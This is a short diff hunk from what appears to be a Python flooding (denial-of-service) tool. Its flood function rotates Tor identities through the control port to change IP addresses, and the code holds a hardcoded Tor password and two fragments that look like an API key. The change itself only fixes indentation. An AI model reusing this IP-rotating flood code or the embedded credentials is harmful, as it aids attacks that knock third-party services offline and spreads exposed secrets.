@@ -39,8 +39,8 @@ def flood(target,domainname,attack,sock):
     with Controller.from_port(port = 9051) as controller:
         controller.authenticate(password="taisaoem")
         controller.signal(Signal.NEWNYM)
-	key1='AIzaSyBHi888UMDA55d'
-	key2='SnonFKSNZtgm-8_6TQ7I'
+    key1='AIzaSyBHi888UMDA55d'
+    key2='SnonFKSNZtgm-8_6TQ7I'
     
     #payload = randomurl()
     if sock =='http':
